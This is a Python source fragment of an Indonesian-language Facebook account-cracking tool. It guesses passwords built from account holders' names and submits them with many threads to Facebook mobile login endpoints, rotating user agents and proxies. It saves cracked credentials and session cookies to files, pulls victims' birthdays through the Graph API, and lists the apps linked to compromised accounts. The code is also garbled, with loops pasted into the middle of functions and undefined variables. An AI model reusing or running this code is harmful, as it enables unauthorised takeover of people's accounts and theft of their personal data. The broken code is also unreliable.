	sleep(5)

	exit(f'\r [{hh}<{P}] crack finished OK:{ok} CP:{cp} ')

				

def otomatis():

	global ok,cp

	print(f"{P} ─────────────────────────────")

	print(f' ok di : {PROFESSIONAL_ok}\n cp di : {PROFESSIONAL_cp}')

	print(f"{P} ─────────────────────────────")

	awal = datetime.now()

	with tred(max_workers=30) as babas:

		for akun in id:

			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()

			depan = nama.split(" ")[0]

			pwx = []

			if len(nama)<=5:

				if len(depan)<=1 or len(depan)<=2:

					pass 

				else:

					pwx.append(depan+"123")

					pwx.append(depan+"1234")

					pwx.append(depan+"12345")

			else:

				if len(depan)<=1 or len(depan)<=2:

					try:

						tengah = nama.split(" ")[1]

						if len(tengah)<=3:

							pass

						else:

							pwx.append(tengah+"123")

							pwx.append(tengah+"1234")

							pwx.append(tengah+"12345")

							pwx.append(nama)

					except:

						try:

							belakang = nama.split(' ')[2]

							if len(belakang)<=3:pass

							else:

								pwx.append(belakang+"123")

								pwx.append(belakang+"1234")

								pwx.append(belakang+"12345")

								pwx.append(nama)

						except:pwx.append(nama)

				else:

					pwx.append(nama)

					pwx.append(depan+"123")

					pwx.append(depan+"1234")

					pwx.append(depan+"12345")

			if 'mobile' in metode:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

			elif 'mbasic' in metode:

				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)

			elif 'free' in metode:

				babas.submit(crack,idf,pwx,"free.facebook.com",awal)

			else:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

	sleep(5)

	exit(f'\r [{hh}<{P}] crack finished OK:{ok} CP:{cp} ')

	#os.popen('play-audio data/selesai.mp3')

				

###---[ MENU CRACK ]---###

resok = []

rescp = []

def crack(idf,pwx,url,awal):

	global loop,ok,cp

	ses = requests.Session()

	#rc = random.choice([m,k,h,u,b])

	ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

	










			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})

			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text

			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}

			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}

			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)

			if "checkpoint" in ses.cookies.get_dict():

				#headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}

				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")

				data = (f'{idf}|{pw}')

				if data in rescp:pass

				else:

					rescp.append(data)

					cp+=1

					if 'ya' in cepeh:

						cek_opsi(idf,pw,ua)

					else:

						try:

							token = open('.token.txt','r').read()

							bas = {"cookie":open('.cookie.txt','r').read()}

							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']

							m, d, y = ttl.split('/')

							m = tete[m]

							print(f'\r └──{kk} {idf}|{pw}|{lahir}|{ua}\n{x}')

							#print(f'\r └──── {hh}{ua}{x}')

							sapi = f'{idf}|{pw}|{d} {m} {y}'

							open('CP/'+PROFESSIONAL_cp,'a').write(sapi+'\n')

							os.popen('play-audio data/cp.mp3')

							break

						except:

							print(f'\r └──{kk} {idf}|{pw}|{ua}\n')

							#print(f'\r └──── {hh}{ua}{x}')

							open('CP/'+PROFESSIONAL_cp,'a').write(idf+'|'+pw+'\n')

							break

			elif "c_user" in ses.cookies.get_dict():

				#headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}

				kuki = convert(ses.cookies.get_dict())

				idf = re.findall('c_user=(.*);xs', kuki)[0]

				data = (f'{idf}|{pw}')

				if data in resok:pass

				else:

					resok.append(data)

					ok+=1

					open('OK/'+PROFESSIONAL_ok,'a').write(data+'\n')

					if "coki" in akunok:

						print(f'\r └──{hh} {idf}|{pw}|{lahir}|{tahun}\n{x}')

						print(f'\r{x} └──{hh}{kuki}|{ua}{x}')

						#print(f'\r{x} └──── {hh}{ua}{x}')

						os.popen('play-audio data/cp.mp3')

						break

					elif "apk" in akunok:

						cek_apk(idf,pw,kuki)

						break				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

		#except Exception as e:print(e)

	loop+=1

	

###---[ CEK OPSI AKUN CP ]---###

opsi = []

def sesi(res):

	response = parser(res,'html.parser')

	form = response.find('form',{'method':'post'})

	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}

	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')

	for i in r.find_all('option'):

		opsi.append(i.text)

	return opsi		

def cek_opsi(idf,pw,ua):

	akun = ''

	ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

	

	ua = random.choice(ua_cek)

	try:

		token = open('.token.txt','r').read()

		bas = {"cookie":open('.cookie.txt','r').read()}

		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']

		m, d, y = ttl.split('/')

		m = tete[m]

		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '

		mek = f"{idf}|{pw}|{day} {month} {year}"

		if 'file' in detek:pass

		else:open('CP/'+PROFESSIONAL_cp,'a').write(mek+'\n')

	except:

		month = ""

		day = ""

		year = ""

		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'

		if 'file' in detek:pass

		else:open('CP/'+PROFESSIONAL_cp,'a').write(idf+'|'+pw+'\n')

	try:

		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}

		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text

		ress = parser(res, 'html.parser')

		form = ress.find('form',{'method':'post'})

		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}

		data2.update({

					'email':idf,

					'pass':pw})

		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text

		ress = parser(res, 'html.parser')

		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):

			akun += f'\n └─ akun tapyes!!.. segera check di fb lite/mbasic🎉{P}                       '

		else:

			if(len(sesi(res))==0):

				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):

					akun += f'\n [{kk}>{P}] {M}akun terpasang auten                     {P}'

				else:

					cok = convert(ses.cookies.get_dict())

					akun += f'\n [{hh}>{P}] {hh}akun OK tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'

			else:

				akun += f'\n └─ terdapat {len(opsi)} opsi :                     '

				o = 0

				for cp in opsi:

					o+=1

					akun += f'\n [{kk}{o}{P}] {cp}               '

		opsi.clear()

	except Exception as e:

		akun += f'\n └─ {M}password akun telah diganti!!                      {P}'

	print('\r'+ akun)

	print('\r                                                                       ')

		

				

###---[ CONVERT COOKIE ]---###

def convert(cookie):

	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))

	return(str(cok))

###---[ CEK APLIKASI ]---###

#--[ convert bahasa ]--#

def language(cookie):

	try:

		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)

		data = parser(url.text,'html.parser')

		for x in data.find_all('form',{'method':'post'}):

			if 'Bahasa Indonesia' in str(x):

				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}

				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)

	except:pass

#--[ pusat print ]--#

apk1, apk2, apk3 = [], [], []

def cek_apk(idf,pw,kuki):

	cookie = {"cookie" : kuki}

	language(cookie)

	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')

	try:		

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"

		get_active(url,cookie)

	except Exception as e:pass

	try:			

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"

		get_inactive(url,cookie)

	except Exception as e:pass

	try:			

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"

		get_remove(url,cookie)

	except Exception as e:pass

	print('\r'+akun)

	if len(apk1)==0:pass

	else:

		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')

		no = 0

		for apk in apk1:

			no += 1

			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')

		print('\r'+akun)

	if len(apk2)==0:pass

	else:

		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')

		no = 0

		for apk in apk2:

			no += 1

			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')

		print('\r'+akun)

	if len(apk3)==0:pass

	else:

		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')

		no = 0

		for apk in apk3:

			no += 1

			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')

		print('\r'+akun)

	apk1.clear()

	apk2.clear()

	apk3.clear()

	print("\r                                             ")

			

			

#--[ cek apk aktif ]--#

def get_active(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Ditambahkan' in apk.text:					

				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_active(next,cookie)

	except:pass

#--[ cek apk kadaluarsa ]--#

def get_inactive(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Kedaluwarsa' in apk.text:

				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_inactive(next,cookie)

	except:pass

#--[ cek apk dihapus ]--#		

def get_remove(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Dihapus' in apk.text:

				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_remove(next,cookie)

	except:pass

	

def make():

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.system('git pull')

	except:pass

	clear_layar()

	back()

	

	

if __name__=='__main__':

	make()	
